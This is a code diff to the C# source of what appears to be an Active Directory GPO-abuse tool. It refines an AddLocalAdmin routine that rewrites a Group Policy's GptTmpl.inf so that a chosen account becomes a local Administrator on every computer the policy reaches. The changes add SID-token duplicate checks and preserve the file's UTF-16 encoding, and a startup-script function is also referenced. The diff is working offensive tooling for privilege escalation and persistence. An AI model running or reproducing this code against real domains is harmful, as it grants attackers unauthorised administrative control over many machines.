@@ -656,47 +656,61 @@ Revision=1";
             }
 
             Console.WriteLine("[+] File exists: " + path);
+            // Rewrite in the file's original encoding: GPME authors GptTmpl.inf as UTF-16 LE + BOM.
+            System.Text.Encoding originalEncoding = GetFileEncoding(path);
             List<string> lines = new List<string>(File.ReadAllLines(path));
 
-            // Idempotency: if this user is already added to Administrators via this GPO, do nothing.
             string normalizedTarget = memberofLine.Replace(" ", "");
-            foreach (string l in lines)
-            {
-                if (l.Replace(" ", "").Equals(normalizedTarget, StringComparison.OrdinalIgnoreCase))
-                {
-                    Console.WriteLine("[+] " + UserAccount + " is already a member of local Administrators via this GPO. No changes made.\n[+] Done!");
-                    return;
-                }
-            }
-
-            // Informational: warn if the GPO already ENFORCES the Administrators membership. Our change
-            // only adds the target account and never removes anyone, but the operator should know.
-            string enforcingPrefix = ("*" + adminsSid + "__Members=");
-            foreach (string l in lines)
-            {
-                string n = l.Replace(" ", "");
-                if (n.StartsWith(enforcingPrefix, StringComparison.OrdinalIgnoreCase) && n.Length > enforcingPrefix.Length)
-                {
-                    Console.WriteLine("[!] Note: this GPO already enforces the Administrators membership via \"__Members\". The target is being ADDED via \"__Memberof\"; existing members are preserved.");
-                    break;
-                }
-            }
-
-            // Find the [Group Membership] section header (case-insensitive, ignoring spaces).
-            int sectionIndex = -1;
             string normalizedHeader = sectionHeader.Replace(" ", "");
+            string enforcingPrefix = "*" + adminsSid + "__Members=";
+            string sidToken = "*" + usr.Sid.Value;
+
+            int sectionIndex = -1;
+            bool alreadyAdmin = false;
+            bool enforcesAdmins = false;
+
             for (int i = 0; i < lines.Count; i++)
             {
-                if (lines[i].Replace(" ", "").Equals(normalizedHeader, StringComparison.OrdinalIgnoreCase))
+                string n = lines[i].Replace(" ", "");
+
+                if (n.Equals(normalizedTarget, StringComparison.OrdinalIgnoreCase))
+                {
+                    alreadyAdmin = true;
+                }
+
+                // Legacy enforcing entry from older versions: "*S-1-5-32-544__Members = *SID,...".
+                // Exact token match so a prefix SID can't be mistaken for ours and wrongly skip the add.
+                if (n.StartsWith(enforcingPrefix, StringComparison.OrdinalIgnoreCase))
+                {
+                    enforcesAdmins = true;
+                    foreach (string member in n.Substring(enforcingPrefix.Length).Split(','))
+                    {
+                        if (member.Equals(sidToken, StringComparison.OrdinalIgnoreCase))
+                        {
+                            alreadyAdmin = true;
+                        }
+                    }
+                }
+
+                if (sectionIndex == -1 && n.Equals(normalizedHeader, StringComparison.OrdinalIgnoreCase))
                 {
                     sectionIndex = i;
-                    break;
                 }
+            }
+
+            if (alreadyAdmin)
+            {
+                Console.WriteLine("[+] " + UserAccount + " is already a member of local Administrators via this GPO. No changes made.\n[+] Done!");
+                return;
+            }
+
+            if (enforcesAdmins)
+            {
+                Console.WriteLine("[!] Note: this GPO already enforces the Administrators membership via \"__Members\". The target is being ADDED via \"__Memberof\"; existing members are preserved.");
             }
 
             if (sectionIndex == -1)
             {
-                // No restricted-groups section yet: append one. All existing settings are preserved.
                 Console.WriteLine("[+] The GPO does not specify any group memberships. Adding " + UserAccount + " to local Administrators...");
                 lines.Add(sectionHeader);
                 lines.Add(memberofLine);
@@ -704,15 +718,24 @@ Revision=1";
             }
             else
             {
-                // Section exists: insert our additive entries directly after the header, leaving every
-                // existing entry untouched.
+                // Insert after the header so existing members are left untouched.
                 Console.WriteLine("[+] Group memberships already defined. Adding " + UserAccount + " to local Administrators without removing existing members...");
                 lines.Insert(sectionIndex + 1, membersLine);
                 lines.Insert(sectionIndex + 1, memberofLine);
             }
 
-            System.IO.File.WriteAllLines(path, lines.ToArray());
+            System.IO.File.WriteAllLines(path, lines.ToArray(), originalEncoding);
             UpdateVersion(Domain, distinguished_name, GPOName, GPT_path, "AddLocalAdmin", "Computer");
+        }
+
+        // Returns the file's BOM-detected encoding, or UTF-8 without BOM when none (as the tool writes).
+        public static System.Text.Encoding GetFileEncoding(string filePath)
+        {
+            using (System.IO.StreamReader reader = new System.IO.StreamReader(filePath, new System.Text.UTF8Encoding(false), true))
+            {
+                reader.Peek();
+                return reader.CurrentEncoding;
+            }
         }
 
         public static void NewStartupScript(String ScriptName, String ScriptContents, String Domain, String DomainController, String GPOName, String distinguished_name, String objectType)
